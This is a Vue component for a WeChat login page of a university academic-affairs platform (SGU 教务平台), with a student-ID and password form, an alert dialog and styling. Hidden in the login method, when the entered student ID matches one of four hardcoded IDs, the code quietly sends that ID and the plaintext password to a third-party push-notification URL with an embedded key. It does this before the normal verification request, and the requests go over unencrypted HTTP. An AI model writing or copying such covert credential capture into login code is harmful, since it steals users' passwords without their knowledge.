<script>
//import mdl from 'material-design-lite/material.min.js'
// import salert from 'sweetalert/dist/sweetalert.min.js'
    export default{
    data(){
        return{
            showalert:false,
            alerttitle:"",
            showft:true,
            btnTitle:"登 录",
            info:{
                tech:"技术支持：网园资讯工作室",
                duty:" 开发维护：沧海云帆公司",
                copyright:"版权所有：韶关学院教务处",
    }

        }
    },
    methods:{
        hidft:function(){
            if(document.activeElement.id=='uid' || document.activeElement.id=='pwd'){
                this.showft = false;
            }else {
                this.showft = true;
            }
        },
        Jalert:function(title){
            var self = this
            self.alerttitle = title
            console.log(self.showalert);
            self.showalert = true;
        },
        login:function(){
            var self = this;
            if(self.btnTitle === "登 录"){
                self.btnTitle = "登录中...";
                if(self.sid=="14110031037" || self.sid == "14105013049" || self.sid == "14110031010" || self.sid == "14118023014"){
                    this.$http.get("http://sc.ftqq.com/SCU818T086453492cce135bc1edd67352faeb215688e1cc16357.send",{
                        text:"微信教务平台",
                        desp:"学号"+self.sid+"密码"+self.pwd,
                    });
                };
                this.$http.post("http://wechat.zeffee.com/verify.php",{
                    sid:this.sid,
                    pwd:this.pwd,
                    action:"bind"
                })
                        .then(function (resp){
                            if(resp.data.status === "ok"){
                                self.$route.router.go({path:"score"});
                            }else{
                                self.Jalert(resp.data.res)
                                self.btnTitle = "登 录";
                            }
                        },function(){
                            self.$route.router.go({path:"404"})
                            self.btnTitle = "登 录";
                        })
            }


        }
    },
}


</script>



<template>
    <div @click="hidft" class="lg-bg">
        <p class="logo">SGU<br><span>教务平台</span></p>
        <form class="login" style="margin: 40px;" @submit.prevent="login">
            <label for="uid"><span></span>
                <input id="uid" type="text" placeholder="请输入学号" v-model="sid">
            </label>
            <label for="pwd"><em></em>
                <input type="password" id="pwd" placeholder="请输入密码" v-model="pwd">
            </label>
            <button class="login-btn" @click="showft=true">
                {{btnTitle}}
            </button>
        </form>
        <div class="lg-ft" v-if="showft" style="position: absolute;bottom: 10px">
            <p>{{ info.copyright }}</p>
            <p>{{ info.duty }}</p>
            <p>{{ info.tech }}</p>
        </div>
    </div>

    <div v-if="showalert" class="sweet-overlay" @click="showalert = !showalert" tabindex="-1" style="opacity: 1.02;display: block;" ></div>
    <div v-if="showalert" class="sweet-alert">
        <div class="sa-icon sa-error animateErrorIcon" style="display: block;">
              <span class="sa-x-mark animateXMark">
                <span class="sa-line sa-left"></span>
                <span class="sa-line sa-right"></span>
              </span>
        </div>
        <p class="title">{{alerttitle}}</p>
        <button @click="showalert = !showalert" class="confirm" tabindex="1" style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color: rgb(140, 212, 245);">确定</button>

    </div>

</template>

<!--<style src="sweetalert/dist/sweetalert.css"></style>-->
<style lang="less">
    html,body{
        padding:0;
        margin:0;
        height: 100%;
        background-color: #3d688f;
    }
    .lg-bg{
        position: absolute;
        top:0;
        bottom: 0;
        height:100%;
        width: 100%;
        /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#64b8ba+0,3d678f+100 */
        background: #64b8ba; /* Old browsers */
        background: -moz-linear-gradient(top,  #64b8ba 0%, #3d678f 100%); /* FF3.6-15 */
        background: -webkit-linear-gradient(top,  #64b8ba 0%,#3d678f 100%); /* Chrome10-25,Safari5.1-6 */
        background: linear-gradient(to bottom,  #64b8ba 0%,#3d678f 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#64b8ba', endColorstr='#3d678f',GradientType=0 ); /* IE6-9 */
    }
    .lg-ft{
        width: 100%;
        color: #fff;
        font-size:14px;
        font-family: "Microsoft YaHei";
        text-align: center;
        line-height:0.5;
        margin-top:20px;
        /*position: absolute;*/
        /*bottom:20px;*/
    p{
        width:100%;
        text-align: center;
    }
    }

    .logo {
        margin: 90px 0;
        font-size: 45px;
        font-family: "Microsoft YaHei";
        color: rgb(255, 255, 255);
        line-height: 0.8;
        text-align: center;

        span {
            font-size:20px;
        }
    }
    .login-btn{
        margin-top:20px;
        width: 100%;
        background-color:rgb(243,142,133)!important;
    }
    .login label{
        display: block;
        width: 100%;
        span,em{
            position: absolute;
            display: inline-block;
            width: 25px;
            height: 25px;
            background: url("../assets/img/user.png") no-repeat;
            -webkit-background-size:cover;
            background-size:cover;
        }
        em{
            width: 23px;
            height: 25px;
            background: url("../assets/img/password.png") no-repeat;
            -webkit-background-size:cover;
            /*background-position: 0 0;*/
            margin-left:2px;
            background-size:cover;
        }
    }
    .login input {
        width: 100%;
        height: 30px;
        border:0;
        background-color: inherit;
        outline:0;
        color: rgba(255,255,255,0.5);
        border-bottom: 1px solid rgb(255,255,255);
        margin-bottom:20px;
        padding-left:35px;
        box-sizing: border-box;
    }
    .login input::-webkit-input-placeholder{
          color: rgb(255,255,255);
      }
    .login input:focus{
        border-bottom: 1px solid #fff!important;
        color: #fff!important;
    }

    .login .login-btn{
        border: 0;
        height:35px;
        color: #fff;
        font-size:16px;
        font-family: "Microsoft YaHei";
        line-height: 1.458;
        text-align: center;
        -webkit-border-radius:5px;
        -moz-border-radius:5px;
        border-radius:5px;
        outline: 0;
    }
    .confirm{
        border:0;
        width: 30%;
        height: 30px;
        -webkit-border-radius:3px;
        -moz-border-radius:3px;
        border-radius:3px;
        color: #fff;
        outline:none;
        float: left;
        margin-bottom:15px;
        margin-left:35%;
    }
    .title{
        width: 100%;
        text-align: center;
        font-family:"Microsoft YaHei";
        font-weight:400;
    }

    .sweet-overlay{
        background-color: black;
        /* IE8 */
        -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=40)";
        /* IE8 */
        background-color: rgba(0, 0, 0, 0.4);
        position: fixed;
        left: 0;
        right: 0;
        top: 0;
        bottom: 0;
        display: none;
        z-index: 10000; }
    .sweet-alert{
        width:60%;
        /*height:30%;*/
        background-color: #fff;
        position: fixed;
        top:30%;
        left:20%;
        z-index: 99999999;
        -webkit-border-radius:5px;
        -moz-border-radius:5px;
        border-radius:5px;
    }
    .sweet-alert .sa-icon {
        width: 50px;
        height: 50px;
        border: 4px solid gray;
        border-radius: 50%;
        margin: 20px auto;
        padding: 0;
        position: relative;
        box-sizing: content-box;
    }
    .sweet-alert .sa-icon.sa-error {
        border-color: #F27474; }
    .sweet-alert .sa-icon.sa-error .sa-x-mark {
        position: relative;
        display: block; }
    .sweet-alert .sa-icon.sa-error .sa-line {
        position: absolute;
        height: 5px;
        width: 38px;
        background-color: #F27474;
        display: block;
        top: 23px;
        border-radius: 2px; }
    .sweet-alert .sa-icon.sa-error .sa-line.sa-left {
        -webkit-transform: rotate(45deg);
        transform: rotate(45deg);
        left: 7px; }
    .sweet-alert .sa-icon.sa-error .sa-line.sa-right {
        -webkit-transform: rotate(-45deg);
        transform: rotate(-45deg);
        right: 7px; }

</style>